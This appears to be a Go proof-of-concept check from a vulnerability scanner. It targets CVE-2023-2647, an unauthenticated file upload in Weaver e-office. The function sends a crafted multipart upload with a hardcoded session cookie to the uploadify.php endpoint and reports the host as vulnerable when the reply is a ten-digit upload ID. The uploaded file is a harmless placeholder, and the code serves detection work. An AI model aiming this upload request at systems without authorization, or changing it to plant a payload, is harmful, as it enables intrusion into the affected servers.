package weaver

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"regexp"
)

func CVE_2023_2647(u string) bool {

	var payload = "------WebKitFormBoundary1ZCUAAAXxnYuVIZR\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\n1\r\n------WebKitFormBoundary1ZCUAAAXxnYuVIZR\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"xxx\"\r\nContent-Type: application/msword\r\n\r\naaaaa\r\n------WebKitFormBoundary1ZCUAAAXxnYuVIZR--"
	header := make(map[string]string)
	header["Content-Type"] = "multipart/form-data; boundary=----WebKitFormBoundary1ZCUAAAXxnYuVIZR"
	header["Cookie"] = "LOGIN_LANG=cn; PHPSESSID=16a132db599e8d54a45e704389a29686"

	if req, err := pkg.HttpRequset(u+"/inc/jquery/uploadify/uploadify.php", "POST", payload, false, header); err == nil {
		//pkg.GoPocLog(req.Body)
		if req.StatusCode == 200 {
			str := req.Body
			var pattern = `^\d{10}$`
			re := regexp.MustCompile(pattern)
			resourceUuid := re.FindStringSubmatch(str)
			//pkg.GoPocLog(fmt.Sprintf("正则匹配内容:%s,长度为：%d\n", resourceUuid, len(resourceUuid)))
			if len(resourceUuid) >= 1 {
				pkg.GoPocLog(fmt.Sprintf("Found vuln weaver_CVE_2023_2647|%s|参考链接：https://mp.weixin.qq.com/s/4vJvjplAXE2TjOzJB0hMfQ\n", u+"/inc/jquery/uploadify/uploadify.php"))
				return true
			}

		}
	}
	return false
}
